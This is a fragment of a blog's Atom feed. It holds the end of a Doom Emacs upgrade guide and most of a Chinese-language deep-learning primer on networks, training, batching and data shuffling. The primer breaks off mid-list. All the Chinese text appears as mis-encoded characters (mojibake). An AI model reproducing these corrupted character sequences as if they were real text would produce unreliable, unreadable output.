&lt;li>ç„¶åé‡å¯ Emacs å³å¯ã€‚&lt;/li>
&lt;/ol>
&lt;h3 id="å‡çº§ç¬¬ä¸‰æ–¹-pacakges">å‡çº§ç¬¬ä¸‰æ–¹ pacakges&lt;/h3>
&lt;ol>
&lt;li>åœ¨ Emacs ä¸­æ‰§è¡Œ &lt;code>M-x straight-pull-all&lt;/code> å‡çº§æ‰€æœ‰çš„ pacakges ã€‚
&lt;ul>
&lt;li>æˆ–è€…ï¼Œæ‰§è¡Œ &lt;code>M-x straight-pull-package-and-deps&lt;/code> å‡çº§æŒ‡å®šçš„ package åŠå…¶å€šèµ–ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ &lt;code>doom build&lt;/code> é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„ pacakges ã€‚&lt;/li>
&lt;li>æœ€åï¼Œé‡å¯ Emacs å³å¯ã€‚&lt;/li>
&lt;/ol>
&lt;h2 id="è¯Šæ–­">è¯Šæ–­&lt;/h2>
&lt;p>æ‰§è¡Œ &lt;code>doom doctor&lt;/code> å‘½ä»¤ï¼Œå¯ä»¥å¯¹ç³»ç»Ÿç¯å¢ƒå’Œé…ç½®è¿›è¡Œè¯Šæ–­ã€‚&lt;/p>
&lt;h2 id="å‚è€ƒ">å‚è€ƒ&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/doomemacs/doomemacs">GitHub - doomemacs/doomemacs: An Emacs framework for the stubborn martian hacker&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/emacs/" term="Emacs" label="Emacs"/></entry><entry><title type="text">æ·±åº¦å­¦ä¹ ç¬”è®°ï¼šç†è®ºåŸºç¡€</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/deep-learning-notes-theory-foundation/"/><id>https://mincodes.com/posts/deep-learning-notes-theory-foundation/</id><updated>2023-12-07T11:21:00+00:00</updated><published>2023-12-07T08:34:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">æ·±åº¦å­¦ä¹ å’Œç¥ç»ç½‘ç»œ æ·±åº¦å­¦ä¹ æ˜¯ä¸€ç§å®ç°æœºå™¨å­¦ä¹ çš„æŠ€æœ¯ï¼Œè€Œç¥ç»ç½‘ç»œæ˜¯å®ç°æ·±åº¦å­¦ä¹ çš„åŸºæœ¬ç»“æ„ã€‚ å…·ä½“æ¥è¯´ï¼š ç¥â€¦</summary><content type="html">&lt;h2 id="æ·±åº¦å­¦ä¹ å’Œç¥ç»ç½‘ç»œ">æ·±åº¦å­¦ä¹ å’Œç¥ç»ç½‘ç»œ&lt;/h2>
&lt;p>æ·±åº¦å­¦ä¹ æ˜¯ä¸€ç§å®ç°æœºå™¨å­¦ä¹ çš„æŠ€æœ¯ï¼Œè€Œç¥ç»ç½‘ç»œæ˜¯å®ç°æ·±åº¦å­¦ä¹ çš„åŸºæœ¬ç»“æ„ã€‚&lt;/p>
&lt;p>å…·ä½“æ¥è¯´ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>ç¥ç»ç½‘ç»œ&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç¥ç»ç½‘ç»œæ˜¯ä¸€ç§æ¨¡ä»¿äººè„‘å¤„ç†ä¿¡æ¯æ–¹å¼çš„è®¡ç®—ç³»ç»Ÿã€‚å®ƒç”±å¤§é‡çš„èŠ‚ç‚¹ï¼ˆç¥ç»å…ƒï¼‰ç»„æˆï¼Œè¿™äº›èŠ‚ç‚¹é€šè¿‡å±‚æ¬¡ç»“æ„ç›¸äº’è¿æ¥ã€‚&lt;/li>
&lt;li>ç¥ç»ç½‘ç»œå¯ä»¥æ˜¯æµ…å±‚çš„ï¼ˆå°‘æ•°å±‚ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯æ·±å±‚çš„ï¼ˆå¤šå±‚ï¼‰ã€‚æµ…å±‚ç¥ç»ç½‘ç»œå¸¸ç”¨äºè¾ƒç®€å•çš„æ¨¡å¼è¯†åˆ«å’Œæ•°æ®åˆ†ç±»ä»»åŠ¡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ·±åº¦å­¦ä¹ &lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ·±åº¦å­¦ä¹ æ˜¯ä¸€ç§æœºå™¨å­¦ä¹ æŠ€æœ¯ï¼Œå®ƒç‰¹åˆ«ä¾èµ–äºæ·±å±‚ç¥ç»ç½‘ç»œï¼Œå³åŒ…å«å¤šä¸ªéšè—å±‚çš„ç¥ç»ç½‘ç»œã€‚&lt;/li>
&lt;li>æ·±å±‚ç¥ç»ç½‘ç»œèƒ½å¤Ÿå­¦ä¹ å’Œæ¨¡æ‹Ÿæ•°æ®ä¸­çš„é«˜åº¦å¤æ‚çš„æ¨¡å¼å’Œå…³ç³»ï¼Œè¿™ä½¿å¾—æ·±åº¦å­¦ä¹ åœ¨å›¾åƒè¯†åˆ«ã€è‡ªç„¶è¯­è¨€å¤„ç†å’Œè®¸å¤šå…¶ä»–é¢†åŸŸéå¸¸æœ‰æ•ˆã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å…³ç³»&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ‰€æœ‰æ·±åº¦å­¦ä¹ æ¨¡å‹éƒ½æ˜¯ç¥ç»ç½‘ç»œï¼Œä½†å¹¶éæ‰€æœ‰ç¥ç»ç½‘ç»œéƒ½ç”¨äºæ·±åº¦å­¦ä¹ ã€‚æ·±åº¦å­¦ä¹ ç‰¹æŒ‡ä½¿ç”¨æ·±å±‚ç¥ç»ç½‘ç»œæ¥è¿›è¡Œå­¦ä¹ å’Œé¢„æµ‹çš„æ–¹æ³•ã€‚&lt;/li>
&lt;li>æ·±åº¦å­¦ä¹ çš„â€œæ·±åº¦â€æŒ‡çš„æ˜¯ç½‘ç»œçš„å±‚æ•°ã€‚æ›´å¤šçš„å±‚ä½¿å¾—ç½‘ç»œèƒ½å¤Ÿæ•è·æ›´å¤æ‚ã€æ›´æŠ½è±¡çš„æ•°æ®ç‰¹å¾ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>æ€»çš„æ¥è¯´ï¼Œç¥ç»ç½‘ç»œæ˜¯æ„æˆæ·±åº¦å­¦ä¹ çš„åŸºç¡€ï¼Œè€Œæ·±åº¦å­¦ä¹ åˆ™æ˜¯åˆ©ç”¨è¿™äº›ç¥ç»ç½‘ç»œæ¥å®ç°å¤æ‚ä»»åŠ¡çš„å­¦ä¹ æ–¹æ³•ã€‚é€šè¿‡æ„å»ºå’Œè®­ç»ƒæ·±å±‚ç¥ç»ç½‘ç»œï¼Œæ·±åº¦å­¦ä¹ æ¨¡å‹èƒ½å¤Ÿå­¦ä¹ ä»ç®€å•åˆ°å¤æ‚çš„æ•°æ®æ¨¡å¼ï¼Œè§£å†³å„ç§å¤æ‚çš„å®é™…é—®é¢˜ã€‚&lt;/p>
&lt;h2 id="ç¥ç»ç½‘ç»œå’Œæ¨¡å‹">ç¥ç»ç½‘ç»œå’Œæ¨¡å‹&lt;/h2>
&lt;p>ç¥ç»ç½‘ç»œå’Œæ¨¡å‹ä¹‹é—´çš„å…³ç³»å¯ä»¥è¿™æ ·æ¥é˜è¿°ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>ç¥ç»ç½‘ç»œ&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç¥ç»ç½‘ç»œæ˜¯ä¸€ä¸ªç”±å¤šå±‚ç¥ç»å…ƒç»„æˆçš„è®¡ç®—ç»“æ„ï¼Œç”¨äºæ¨¡æ‹Ÿå¤æ‚çš„å‡½æ•°æ˜ å°„ã€‚æ¯å±‚åŒ…å«è‹¥å¹²ç¥ç»å…ƒï¼Œæ¯ä¸ªç¥ç»å…ƒé€šè¿‡æƒé‡å’Œåå·®ä¸å…¶ä»–ç¥ç»å…ƒç›¸è¿ã€‚&lt;/li>
&lt;li>ç¥ç»ç½‘ç»œçš„è®¾è®¡ï¼ˆä¾‹å¦‚ï¼Œå±‚æ•°ã€æ¯å±‚çš„ç¥ç»å…ƒæ•°é‡ã€æ¿€æ´»å‡½æ•°ç­‰ï¼‰å®šä¹‰äº†å…¶ç»“æ„å’Œæ½œåœ¨çš„è®¡ç®—èƒ½åŠ›ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ¨¡å‹&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>å½“æˆ‘ä»¬è°ˆè®ºâ€œæ¨¡å‹â€æ—¶ï¼Œé€šå¸¸æŒ‡çš„æ˜¯è®­ç»ƒå¥½çš„ç¥ç»ç½‘ç»œï¼ŒåŒ…æ‹¬å…¶æ‰€æœ‰å‚æ•°ï¼ˆæƒé‡å’Œåå·®ï¼‰çš„ç‰¹å®šè®¾ç½®ã€‚&lt;/li>
&lt;li>æ¨¡å‹æ˜¯ç¥ç»ç½‘ç»œè®­ç»ƒè¿‡ç¨‹çš„äº§ç‰©ï¼Œå®ƒæ•æ‰äº†è®­ç»ƒæ•°æ®ä¸­çš„æ¨¡å¼å’Œå…³ç³»ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>è®­ç»ƒè¿‡ç¨‹&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œç¥ç»ç½‘ç»œé€šè¿‡è°ƒæ•´å…¶æƒé‡å’Œåå·®æ¥å­¦ä¹ æ•°æ®ä¸­çš„æ¨¡å¼ã€‚&lt;/li>
&lt;li>è¿™äº›è°ƒæ•´æ˜¯é€šè¿‡è®¡ç®—æŸå¤±å‡½æ•°çš„æ¢¯åº¦å¹¶åº”ç”¨ä¼˜åŒ–ç®—æ³•ï¼ˆå¦‚æ¢¯åº¦ä¸‹é™ï¼‰æ¥å®ç°çš„ã€‚&lt;/li>
&lt;li>è®­ç»ƒå®Œæˆåï¼Œç½‘ç»œçš„æƒé‡å’Œåå·®è¢«â€œå†»ç»“â€ï¼Œå½¢æˆäº†æœ€ç»ˆçš„æ¨¡å‹ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å…³ç³»å’Œç†è§£&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>å¯ä»¥å°†ç¥ç»ç½‘ç»œè§†ä¸ºæ¨¡å‹çš„â€œè“å›¾â€ï¼Œè€Œè®­ç»ƒåçš„ç½‘ç»œåˆ™æ˜¯æ ¹æ®è¿™ä¸ªè“å›¾æ„å»ºçš„å…·ä½“å®ä¾‹ã€‚&lt;/li>
&lt;li>æ¨¡å‹æ˜¯è®­ç»ƒè¿‡ç¨‹çš„ç»“æœï¼Œå®ƒåŒ…å«äº†ä¸ºäº†æœ€å¤§åŒ–æ€§èƒ½è€Œè°ƒæ•´å’Œä¼˜åŒ–çš„å‚æ•°é›†åˆã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>æ€»çš„æ¥è¯´ï¼Œç¥ç»ç½‘ç»œåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­è‡ªåŠ¨æ›´æ–°å…¶æƒé‡å’Œå‚æ•°ï¼Œè€Œè®­ç»ƒå®Œæˆåï¼Œè¿™äº›ä¼˜åŒ–è¿‡çš„æƒé‡å’Œå‚æ•°å€¼æ„æˆäº†æœ€ç»ˆçš„æ¨¡å‹ã€‚è¿™ä¸ªæ¨¡å‹å¯ä»¥ç”¨æ¥åšé¢„æµ‹æˆ–è¿›ä¸€æ­¥åˆ†æã€‚&lt;/p>
&lt;h2 id="ç¥ç»ç½‘ç»œçš„å­¦ä¹ è¿‡ç¨‹">ç¥ç»ç½‘ç»œçš„å­¦ä¹ è¿‡ç¨‹&lt;/h2>
&lt;p>ä»¥å›¾ç‰‡åˆ†ç±»é—®é¢˜ä¸ºä¾‹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>åˆå§‹çŠ¶æ€&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨è®­ç»ƒå¼€å§‹æ—¶ï¼Œç¥ç»ç½‘ç»œçš„æƒé‡å’Œåå·®é€šå¸¸æ˜¯éšæœºåˆå§‹åŒ–çš„ã€‚è¿™æ„å‘³ç€ç½‘ç»œå¯¹äºåˆ†ç±»ä»»åŠ¡â€œä¸€æ— æ‰€çŸ¥â€ï¼Œå…¶åˆå§‹é¢„æµ‹æ˜¯åŸºäºè¿™äº›éšæœºå‚æ•°ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å–‚å…¥æ•°æ®&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç„¶åï¼Œæˆ‘ä»¬å‘ç½‘ç»œå–‚å…¥å¸¦æœ‰æ ‡ç­¾çš„è®­ç»ƒæ•°æ®ã€‚åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œè¿™é€šå¸¸æ˜¯ä¸€ç»„æ ‡è®°äº†æ­£ç¡®ç±»åˆ«çš„å›¾ç‰‡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>è¿›è¡Œé¢„æµ‹&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>å¯¹äºæ¯å¼ å›¾ç‰‡ï¼Œç½‘ç»œæ ¹æ®å½“å‰çš„æƒé‡å’Œåå·®è¿›è¡Œé¢„æµ‹ï¼Œå°è¯•åˆ¤æ–­å›¾ç‰‡æ‰€å±çš„ç±»åˆ«ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>è®¡ç®—æŸå¤±&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç½‘ç»œçš„é¢„æµ‹ç»“æœä¼šä¸å®é™…çš„æ ‡ç­¾è¿›è¡Œæ¯”è¾ƒï¼Œä½¿ç”¨æŸå¤±å‡½æ•°æ¥è®¡ç®—é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®å¼‚ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°ï¼Œåœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¡¡é‡ç½‘ç»œé¢„æµ‹çš„æ¦‚ç‡åˆ†å¸ƒä¸å®é™…æ ‡ç­¾çš„æ¦‚ç‡åˆ†å¸ƒä¹‹é—´çš„å·®å¼‚ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>è°ƒæ•´æƒé‡å’Œåå·®&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ ¹æ®æŸå¤±å‡½æ•°çš„ç»“æœï¼Œç½‘ç»œé€šè¿‡æ¢¯åº¦ä¸‹é™ï¼ˆæˆ–å…¶ä»–ä¼˜åŒ–ç®—æ³•ï¼‰æ¥è°ƒæ•´å…¶æƒé‡å’Œåå·®ã€‚è¿™ä¸ªè°ƒæ•´æ˜¯ä¸ºäº†å‡å°‘æŸå¤±ï¼Œå³å‡å°‘é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®å¼‚ã€‚&lt;/li>
&lt;li>è¿™ä¸ªè¿‡ç¨‹æ¶‰åŠåˆ°è®¡ç®—æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¯ä¸ªæƒé‡å’Œåå·®çš„æ¢¯åº¦ï¼Œç„¶åæŒ‰è¿™äº›æ¢¯åº¦çš„æ–¹å‘æ¥æ›´æ–°å‚æ•°ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>è¿­ä»£å’Œå­¦ä¹ &lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>è¿™ä¸ªè¿‡ç¨‹åœ¨æ•´ä¸ªè®­ç»ƒé›†ä¸Šåå¤è¿›è¡Œï¼Œç½‘ç»œé€æ¸å­¦ä¹ å¹¶æå‡å…¶é¢„æµ‹çš„å‡†ç¡®æ€§ã€‚&lt;/li>
&lt;li>éšç€è®­ç»ƒçš„è¿›è¡Œï¼Œç½‘ç»œèƒ½å¤Ÿæ›´å¥½åœ°ç†è§£æ•°æ®ä¸­çš„æ¨¡å¼å’Œç‰¹å¾ï¼Œä»è€Œåœ¨é¢å¯¹æ–°çš„ã€æœªè§è¿‡çš„æ•°æ®æ—¶ä¹Ÿèƒ½åšå‡ºæ›´å‡†ç¡®çš„é¢„æµ‹ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>æ€»çš„æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªè¿­ä»£çš„å­¦ä¹ è¿‡ç¨‹ï¼Œç¥ç»ç½‘ç»œé€šè¿‡ä¸æ–­è°ƒæ•´è‡ªèº«çš„å‚æ•°ï¼Œä»¥æœ€å°åŒ–æŸå¤±å‡½æ•°ï¼Œè¿›è€Œæé«˜å¯¹æ•°æ®çš„ç†è§£å’Œåˆ†ç±»çš„å‡†ç¡®æ€§ã€‚&lt;/p>
&lt;h3 id="æ‰¹é‡å­¦ä¹ batch-learning">æ‰¹é‡å­¦ä¹ ï¼ˆBatch Learningï¼‰&lt;/h3>
&lt;p>ç¥ç»ç½‘ç»œåœ¨è®¡ç®—æŸå¤±æ—¶é€šå¸¸é‡‡ç”¨çš„æ˜¯åˆ†ç»„ï¼ˆæ‰¹å¤„ç†ï¼‰çš„æ–¹å¼ã€‚è¿™ç§æ–¹æ³•è¢«ç§°ä¸ºæ‰¹é‡å­¦ä¹ ï¼ˆBatch Learningï¼‰ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œç½‘ç»œä¸æ˜¯å¯¹æ¯å¼ å›¾ç‰‡å•ç‹¬è¿›è¡Œé¢„æµ‹å’Œè®¡ç®—æŸå¤±ï¼Œè€Œæ˜¯å¯¹ä¸€ç»„å›¾ç‰‡ï¼ˆå³ä¸€ä¸ªæ‰¹æ¬¡ï¼‰è¿›è¡Œé¢„æµ‹ï¼Œç„¶åè®¡ç®—è¿™ä¸ªæ‰¹æ¬¡çš„æ€»æŸå¤±ã€‚ä»¥ä¸‹æ˜¯è¿™ä¸ªè¿‡ç¨‹çš„å…³é”®ç‚¹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>æ‰¹å¤„ç†ï¼ˆBatchingï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨è®­ç»ƒç¥ç»ç½‘ç»œæ—¶ï¼Œæ•°æ®é€šå¸¸è¢«åˆ†æˆå°æ‰¹æ¬¡ï¼ˆbatchesï¼‰ã€‚ä¸€ä¸ªæ‰¹æ¬¡åŒ…å«å¤šå¼ å›¾ç‰‡ï¼Œæ‰¹æ¬¡çš„å¤§å°ï¼ˆå³æ‰¹å¤§å°ï¼ŒBatch Sizeï¼‰å¯ä»¥æ ¹æ®éœ€è¦å’Œç¡¬ä»¶èµ„æºè¿›è¡Œè®¾ç½®ã€‚&lt;/li>
&lt;li>æ‰¹å¤§å°æ˜¯ä¸€ä¸ªé‡è¦çš„è¶…å‚æ•°ï¼Œå®ƒå½±å“ç€æ¨¡å‹çš„å†…å­˜å ç”¨ã€è®­ç»ƒé€Ÿåº¦å’Œæ”¶æ•›æ€§ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>é¢„æµ‹å’ŒæŸå¤±è®¡ç®—&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç½‘ç»œå¯¹æ•´ä¸ªæ‰¹æ¬¡çš„æ‰€æœ‰å›¾ç‰‡åŒæ—¶è¿›è¡Œé¢„æµ‹ã€‚&lt;/li>
&lt;li>ç„¶åï¼ŒæŸå¤±å‡½æ•°è®¡ç®—æ¯å¼ å›¾ç‰‡çš„é¢„æµ‹ç»“æœä¸å…¶å®é™…æ ‡ç­¾ä¹‹é—´çš„å·®å¼‚ï¼Œå¹¶å°†è¿™äº›å·®å¼‚åˆæˆæ•´ä¸ªæ‰¹æ¬¡çš„æ€»æŸå¤±ã€‚åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œå¦‚æœä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°ï¼Œè¿™æ„å‘³ç€å¯¹æ‰¹æ¬¡ä¸­æ¯å¼ å›¾ç‰‡çš„é¢„æµ‹æ¦‚ç‡åˆ†å¸ƒä¸å®é™…æ ‡ç­¾çš„æ¦‚ç‡åˆ†å¸ƒä¹‹é—´çš„å·®å¼‚è¿›è¡Œè®¡ç®—å’Œæ±‚å’Œã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ¢¯åº¦è®¡ç®—å’Œå‚æ•°æ›´æ–°&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ ¹æ®è¿™ä¸ªæ‰¹æ¬¡çš„æ€»æŸå¤±ï¼Œè®¡ç®—æŸå¤±ç›¸å¯¹äºç½‘ç»œå‚æ•°çš„æ¢¯åº¦ã€‚&lt;/li>
&lt;li>è¿™äº›æ¢¯åº¦ç”¨äºæ›´æ–°ç½‘ç»œçš„æƒé‡å’Œåå·®ï¼Œä»¥å‡å°‘æœªæ¥é¢„æµ‹çš„æ€»æŸå¤±ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ä¼˜åŠ¿&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>æ‰¹å¤„ç†å¯ä»¥æé«˜æ•°æ®å¤„ç†çš„æ•ˆç‡ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨GPUç­‰ç¡¬ä»¶åŠ é€Ÿæ—¶ã€‚&lt;/li>
&lt;li>å®ƒè¿˜æœ‰åŠ©äºç¨³å®šå­¦ä¹ è¿‡ç¨‹ï¼Œå› ä¸ºæ¯æ¬¡æ›´æ–°æ˜¯åŸºäºå¤šä¸ªæ ·æœ¬çš„å¹³å‡æŸå¤±ï¼Œè€Œä¸æ˜¯å•ä¸ªæ ·æœ¬çš„æŸå¤±ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>æ€»çš„æ¥è¯´ï¼Œé€šè¿‡æ‰¹é‡å¤„ç†æ–¹æ³•ï¼Œç¥ç»ç½‘ç»œåœ¨æ¯æ¬¡æ›´æ–°å‚æ•°ä¹‹å‰ï¼Œéƒ½ä¼šè€ƒè™‘ä¸€ç»„æ•°æ®çš„æ€»ä½“è¡¨ç°ï¼Œè€Œä¸æ˜¯å•ä¸ªæ•°æ®ç‚¹ã€‚è¿™ç§æ–¹æ³•æœ‰åŠ©äºæé«˜è®­ç»ƒçš„æ•ˆç‡å’Œç¨³å®šæ€§ã€‚&lt;/p>
&lt;h3 id="è®­ç»ƒæ•°æ®çš„é¡ºåº">è®­ç»ƒæ•°æ®çš„é¡ºåº&lt;/h3>
&lt;p>åœ¨è®­ç»ƒåˆ†ç±»æ¨¡å‹æ—¶ï¼Œè¾“å…¥æ•°æ®çš„éšæœºåŒ–ï¼ˆå³å°†ä¸åŒç±»åˆ«çš„æ ·æœ¬æ··åˆï¼‰é€šå¸¸æ˜¯æ¨èçš„åšæ³•ã€‚ä»¥ä¸‹æ˜¯è¿™ç§åšæ³•çš„åŸå› ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>é¿å…åè§&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>å¦‚æœç¥ç»ç½‘ç»œå…ˆè®­ç»ƒæ‰€æœ‰çš„çŒ«çš„å›¾ç‰‡ï¼Œç„¶åå†è®­ç»ƒæ‰€æœ‰çš„ç‹—çš„å›¾ç‰‡ï¼Œå®ƒå¯èƒ½ä¼šåœ¨è®­ç»ƒåˆæœŸè¿‡åº¦é€‚åº”ï¼ˆå³è¿‡æ‹Ÿåˆï¼‰çŒ«çš„ç‰¹å¾ï¼Œä»è€Œå¿½ç•¥äº†ç‹—çš„ç‰¹å¾ã€‚è¿™å¯èƒ½å¯¼è‡´æ¨¡å‹åœ¨åˆå§‹é˜¶æ®µå½¢æˆåè§ï¼Œä½¿å¾—åæœŸéš¾ä»¥æ­£ç¡®å­¦ä¹ å’Œè¯†åˆ«ç‹—çš„ç‰¹å¾ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æé«˜æ³›åŒ–èƒ½åŠ›&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>é€šè¿‡éšæœºæ··åˆä¸åŒç±»åˆ«çš„å›¾ç‰‡ï¼Œæ¨¡å‹èƒ½å¤Ÿæ›´å¹³è¡¡åœ°å­¦ä¹ å„ä¸ªç±»åˆ«çš„ç‰¹å¾ã€‚è¿™æœ‰åŠ©äºæé«˜æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ï¼Œå³åœ¨æœªè§è¿‡çš„æ–°æ•°æ®ä¸Šçš„è¡¨ç°ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>é¿å…è¿‡æ—©æ”¶æ•›&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>å¦‚æœæ•°æ®æ˜¯æœ‰åºçš„ï¼Œæ¨¡å‹å¯èƒ½ä¼šåœ¨è®­ç»ƒçš„æ—©æœŸé˜¶æ®µè¿‡æ—©åœ°æ”¶æ•›åˆ°å¯¹å½“å‰é¡ºåºæ•æ„Ÿçš„è§£å†³æ–¹æ¡ˆã€‚é€šè¿‡éšæœºåŒ–æ•°æ®ï¼Œå¯ä»¥ä¿ƒä½¿æ¨¡å‹æ¢ç´¢æ›´å¤šçš„å¯èƒ½æ€§ï¼Œä»è€Œæ‰¾åˆ°æ›´å…·æ³›åŒ–æ€§çš„è§£å†³æ–¹æ¡ˆã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å®è·µä¸­çš„æ“ä½œ&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>åœ¨å®é™…æ“ä½œä¸­ï¼Œé€šå¸¸ä¼šåœ¨æ¯ä¸ªè®­ç»ƒå‘¨æœŸï¼ˆepochï¼‰å¼€å§‹å‰éšæœºæ‰“ä¹±æ•°æ®ã€‚è¿™æ„å‘³ç€æ¯ä¸ªæ‰¹æ¬¡ï¼ˆbatchï¼‰ä¸­çš„å›¾ç‰‡éƒ½æ˜¯éšæœºé€‰æ‹©çš„ï¼ŒåŒ…å«ä¸åŒç±»åˆ«çš„æ··åˆã€‚&lt;/li>
&lt;li>è¿™ç§æ–¹æ³•æœ‰åŠ©äºç¡®ä¿æ¯ä¸ªç±»åˆ«åœ¨æ•´ä¸ªè®­ç»ƒè¿‡ç¨‹ä¸­éƒ½è¢«å…¬å¹³åœ°è¡¨ç¤ºã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>å› æ­¤ï¼Œä¸ºäº†è·å¾—æœ€ä½³çš„è®­ç»ƒæ•ˆæœï¼Œæ¨èå°†ä¸åŒæ ‡ç­¾çš„å›¾ç‰‡æ··åˆåœ¨ä¸€èµ·ï¼Œç„¶åè¿›è¡ŒéšæœºåŒ–å¤„ç†åè¾“å…¥è®­ç»ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿æ¨¡å‹èƒ½å¤Ÿæ›´æœ‰æ•ˆåœ°å­¦ä¹ åŒºåˆ†è¿™ä¸¤ä¸ªç±»åˆ«çš„ç‰¹å¾ã€‚&lt;/p>
&lt;h2 id="å¯¹ç¥ç»å…ƒçš„ç†è§£">å¯¹ç¥ç»å…ƒçš„ç†è§£&lt;/h2>
&lt;p>ç¥ç»å…ƒåœ¨ç¥ç»ç½‘ç»œä¸­å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªæ•°å­¦å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯ç¥ç»å…ƒçš„æœ¬è´¨ä»¥åŠæƒé‡å’Œåå·®åœ¨å…¶ä¸­çš„ä½œç”¨ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>ç¥ç»å…ƒçš„æœ¬è´¨&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç¥ç»å…ƒï¼ˆæˆ–ç§°ä¸ºèŠ‚ç‚¹ï¼‰åŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªæ¥æ”¶è¾“å…¥ã€äº§ç”Ÿè¾“å‡ºçš„æ•°å­¦å‡½æ•°ã€‚&lt;/li>
&lt;li>å®ƒæ¥æ”¶æ¥è‡ªå‰ä¸€å±‚ç¥ç»å…ƒçš„å¤šä¸ªè¾“å…¥ï¼Œè¿™äº›è¾“å…¥é€šå¸¸æ˜¯åŠ æƒå’Œçš„å½¢å¼ï¼Œå…¶ä¸­æ¯ä¸ªè¾“å…¥éƒ½è¢«ç›¸åº”çš„æƒé‡æ‰€ä¹˜ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ¿€æ´»å‡½æ•°&lt;/strong>:&lt;/p>
&lt;ul>
